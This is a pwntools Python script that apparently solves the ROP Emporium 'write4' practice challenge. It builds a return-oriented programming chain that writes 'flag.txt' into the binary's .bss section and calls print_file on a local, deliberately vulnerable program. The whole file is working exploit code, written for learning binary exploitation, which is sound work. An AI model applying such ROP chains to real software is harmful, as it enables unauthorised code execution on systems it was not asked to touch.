from pwn import *
import os

os.environ["SHELL"] = '/bin/sh'

libwrite4 = ELF('./libwrite4.so')
context.binary = elf = ELF('./write4')
context.arch = 'amd64'
context.os = 'linux'
context.terminal = ['st', '--', '/bin/sh', '-c']

find_offset = cyclic(200)
offset = cyclic_find('maaanaaa') # 48

# elements that will be used in the ROP chain

#main_addr = elf.symbols['main']

r_ret = 0x71e

pop_r14_r15 = 0x400690
mov_r14_r15 = 0x400628
pop_rdi = 0x400693

print_file = elf.plt['print_file']

flag = b"flag.txt"

bss_addr = elf.bss()



payload = flat(
        b'a' * 40,
        p64(pop_r14_r15),
        p64(bss_addr),
        u64(flag),
        p64(mov_r14_r15),
        p64(pop_rdi),
        p64(bss_addr),
        p64(print_file),
        )

gdb_script = '''
            break pwnme
            continue
        '''

#io = gdb.debug(elf.path, gdbscript=gdb_script)
io = elf.process()

pause()

print(io.recv().decode())

io.sendline(payload)

print(io.recv().decode())

pause()
